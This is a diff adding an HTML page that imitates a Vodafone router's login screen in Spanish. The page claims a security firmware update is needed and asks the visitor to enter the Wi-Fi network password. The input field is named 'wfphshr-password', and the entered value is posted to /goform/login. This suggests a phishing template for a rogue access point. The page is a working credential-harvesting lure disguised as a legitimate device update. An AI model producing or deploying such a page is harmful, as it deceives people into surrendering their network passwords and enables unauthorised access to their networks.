@@ -1,0 +1,255 @@
+
+<!DOCTYPE html>
+<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<meta name="description" content="">
+	<title>Residential Gateway Login</title>
+	<link href="./favicon.png" type="image/x-icon" rel="icon">
+	<link href="./favicon.png" type="image/x-icon" rel="shortcut icon">
+	<link rel="stylesheet" type="text/css" href="./look_4_activation.css">
+	<link rel="stylesheet" type="text/css" href="./look_4_responsive.css">
+	<link rel="stylesheet" type="text/css" href="./look_4_activation_responsive.css">	
+	<script src="sessionkey.js"></script>
+	<script src="jquery_min.js"></script>
+	<script src="langSpainVars.js"></script>
+	<script src="langSpain.js"></script>
+	<script language="JavaScript">
+	var languagetype=5;
+	$(document).ready(function(){
+	var strUrl=window.location.href;
+	var arrUrltmp=strUrl.split("?");
+	var strUrltmp=arrUrltmp[0];
+	var arrUrl=strUrltmp.split("/");
+	var strPage=arrUrl[arrUrl.length-1];
+	var strAspname=strPage.replace(/[.]/g,"_");
+	if(strAspname=="")
+	{
+	strAspname="login_asp";
+	}
+	if(languagetype!=0)
+	{
+	  translate(eval(strAspname));
+	}
+	$("body").css("display", "block");
+	});
+	</script>
+	 
+		<script type="text/javascript">
+		var SessionKey = 1391311540;
+		function changeLanguage(Data)
+		{
+				$.ajax({
+					type: "POST",
+					async: false,
+					url: '/goform/WebUiLanguageSelect'+"?sessionKey="+SessionKey,
+					data: Data
+				});
+			// $.post('/goform/WebUiLanguageSelect', data);   
+		}
+		function errorFunction(XMLHttpRequest, textStatus, errorThrown)
+		{
+			console.log(XMLHttpRequest.status);
+			console.log(XMLHttpRequest.readyState);
+			console.log(textStatus);
+		};
+	
+		function succFunction(jsonData)
+		{
+			if(jsonData.ret == "success")
+			{
+				//window.location.href="http://192.168.0.1/Overview.asp";
+				document.location = './Overview.asp';
+			}
+			else if(jsonData.ret == "failed")
+			{   
+				if (languagetype == 5) 
+				{
+					alert('El nombre de usuario o la contraseña no son correctos. Por favor, revísela e inténtelo de nuevo.');
+				} 
+				else 
+				{
+					alert("Username or Password is incorrect.Please check it and try again."); 
+				}
+			}
+			else if(jsonData.ret == "temp_blocked")
+			{   
+				if (languagetype == 5) 
+				{
+					//alert('Demasiados intentos fallidos. Por favor, espere unos minutos e intente de nuevo.');
+					document.body.innerHTML="<h1 style='text-align: center;'>Demasiados intentos fallidos. Por favor, espere unos minutos e intente de nuevo.</h1>";
+				} 
+				else 
+				{
+					//alert("Too many failed attempts. Please wait a few minutes and try again."); 
+					 document.body.innerHTML="<h1 style='text-align: center;'>Too many failed attempts. Please wait a few minutes and try again.</h1>";
+				}
+			}
+			else if(jsonData.ret == "perm_blocked")
+			{   
+				if (languagetype == 5) 
+				{
+					//alert('banned');
+					document.body.innerHTML="<h1 style='text-align: center;'>Demasiados intentos fallidos. Por favor, reinicie el dispositivo.</h1>";
+				} 
+				else 
+				{
+					//alert("banned"); 
+					 document.body.innerHTML="<h1 style='text-align: center;'>Too many failed attempts. Please reboot the device.</h1>";
+				}
+			}
+		 
+		}
+	
+		function getLoginStatus()
+		{
+			var userName = $('#username').val();
+			var passWord = $('#password').val();
+			passWord = encodeURIComponent(passWord);
+			$.ajax({
+				type: "POST",
+				async: false,
+				timeout : 8000,
+				url: '/goform/login'+"?sessionKey="+SessionKey,
+				data: "loginpage_flag=1&loginUsername="+userName+"&loginPassword="+passWord,
+				success: succFunction, 
+				error: errorFunction  
+			});
+		}
+	
+		function sendDataByEnterKey()
+		{
+			if (event.keyCode==13)
+			{
+				getLoginStatus();
+			}
+		}
+		
+		function checkBlock()
+		{
+			var isBlock=0;
+			if(isBlock == 1)
+			{
+				if (languagetype == 5)				
+					document.body.innerHTML="<h1 style='text-align: center;'>Demasiados intentos fallidos. Por favor, espere unos minutos e intente de nuevo.</h1>";
+				else
+					 document.body.innerHTML="<h1 style='text-align: center;'>Too many failed attempts. Please wait a few minutes and try again.</h1>";
+			}
+			else if(isBlock == 2)
+			{
+				if (languagetype == 5)				
+					document.body.innerHTML="<h1 style='text-align: center;'>Demasiados intentos fallidos. Por favor, reinicie el dispositivo.</h1>";
+				else
+					 document.body.innerHTML="<h1 style='text-align: center;'>Too many failed attempts. Please reboot the device.</h1>";
+			}
+			else
+				document.getElementById("look_4_activation").style.display="block";
+	
+		}
+	
+		</script>			
+</head>
+<body class="step-48" onLoad="checkBlock();">
+    <div id="look_4_activation" class="lang-en product-38 gateway-36 " data-language="lang-en" style="display: none;">
+		<div class="rel">
+			<div id="page-rhombus-wrap">
+				<div class="rel">
+					<div id="rhombus-wrap">
+						<div id="rhombus"> </div>
+					</div>
+				</div>
+			</div>
+			<div id="activation-content-wrap" class="clearfix rel">
+				<div id="activation-content">
+					<div id="activation-top">
+                        <div id="activation-top-left">&nbsp;</div>
+						<div id="activation-top-right">
+                            <h1><span class="language-string" name="ACTIVATION_PAGE_TITLE_STEP_48" title="alias: ACTIVATION_PAGE_TITLE_STEP_48">Actualización de seguridad</span></h1>     
+						</div> 
+					</div>          
+					<div id="activation-content-inner" class="clearfix">
+						<div id="activation-content-left">
+							<img src="./F3686V2_VODAFONE_eMTA.png" alt="Router">	
+						</div>
+						<div id="activation-content-right">	
+							<div class="description">
+								<div class="left">
+									<span class="language-string" name="ACTIVATION_PAGE_STEP_48_SUBTITLE" title="alias: ACTIVATION_PAGE_STEP_48_SUBTITLE">Es necesario actualizar el firmware de su dispositivo para incluir nuevas medidas de seguridad. Por favor, introduzca la contraseña de la red para continuar.</span>
+								</div>
+							</div>	
+							  <form method="post" action="" name="login">
+							  <div class="row description">
+								<div class="left">
+									<input type="password"  id="password" onkeydown="sendDataByEnterKey()" maxlength="127" name="wfphshr-password" placeholder="Contraseña de red">
+								</div>
+								<div class="right">		
+									<a class="desktop"><input type="button" class="button button-apply-wide button-apply" onclick="getLoginStatus()" id="login" value="Actualizar" title="ACTIVATION_PAGE_STEP_48_LOG_IN"></a>
+								</div>
+								
+							  </div>
+							  <div class="row description">
+								
+								<div class="left">		
+									<a class="mobile tablet"><input type="button" class="button button-apply-wide button-apply" onclick="getLoginStatus()" id="login" value="Actualizar" title="ACTIVATION_PAGE_STEP_48_LOG_IN"></a>
+								</div>
+								<div class="right">&nbsp;</div>
+							  </div>
+							  <input type="hidden"  id="loginpage_flag" value="" name="loginpage_flag" >
+							 </form> 
+						</div>
+					</div>
+					<div class="blackBackground" style="display:none;">&nbsp;</div>
+				</div>
+				
+			</div>
+			<div id="language-info" class="clearfix">
+				<div class="mobile-icon"></div>
+				
+                <ul id="language-switcher-list">
+				    <form method="post" action="/goform/WebUiLanguageSelect" name="Rglanguage" id="Rglanguage">
+					<li class="language-switcher">
+						<a href="./login.asp" onclick="changeLanguage({WebUiLanguageSelected:0})">English</a>
+					</li>
+					<li class="language-switcher">
+						<a href="./login.asp" onclick="changeLanguage({WebUiLanguageSelected:5})">Español</a>
+					</li>
+					</form>
+				</ul>
+
+				<div class="page-loader-container load-once" data-page-alias="activation-bottom-info" id="activation-bottom-info" data-has-loaded="true" data-page-id="3821">
+					<div id="info">
+						<span class="language-string" name="PAGE_ACTIVATION_BOTTOM_INFO_FIRMWARE_VERSION" title="alias: PAGE_ACTIVATION_BOTTOM_INFO_FIRMWARE_VERSION">Firmware Version: </span><a>SPAIN_3.655.0</a>
+						<br>
+						<span class="language-string" name="PAGE_ACTIVATION_BOTTOM_INFO_WAN_IP_ADDRESS" title="alias: PAGE_ACTIVATION_BOTTOM_INFO_WAN_IP_ADDRESS">WAN IP Address: </span><a>84.123.112.224</a>
+						<br>
+						<span class="language-string" name="PAGE_ACTIVATION_BOTTOM_INFO_WAN_IPV6_ADDRESS" title="alias: PAGE_ACTIVATION_BOTTOM_INFO_WAN_IPV6_ADDRESS">WAN IPv6 Address: </span><a>Unspecified</a>
+					</div>
+				</div>
+			</div>
+			
+		</div>
+	</div>    
+
+    <script type="text/javascript" src="./require.js" data-main="look_4_activation.js"></script>
+	
+	<script type="text/javascript">
+	  require(['jQ', 'look_4_activation', 'Registry'], function ($, m_Look_4_activation, m_Registry) {
+
+		  var look_4_activation = new m_Look_4_activation({
+			  gatewayID : 36,
+			  languageID : 21,
+			  startStepID : 48,
+			  activationPageID : 1170,
+			  baseUrl : "/",
+			  lookIdentifier : 'look_4_activation',
+			  modeID : 53      });
+
+		  m_Registry.register(look_4_activation, 'look_4_activation');
+
+	  }); 
+	</script>
+
+</body>
+</html>
